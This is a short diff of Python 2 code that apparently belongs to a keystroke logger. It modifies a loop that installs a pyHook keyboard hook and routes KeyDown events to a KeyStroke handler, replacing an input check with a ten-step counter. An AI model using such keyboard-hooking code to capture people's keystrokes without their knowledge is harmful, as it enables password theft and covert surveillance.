@@ -70,8 +70,10 @@ def KeyStroke(event):
 
 def run():
     print "\n 0000000"
+    ti=0
     while True :
-        if input()!='0':
+        ti+=1
+        if ti<10:
             kl = pyHook.HookManager()
             kl.KeyDown = KeyStroke
 
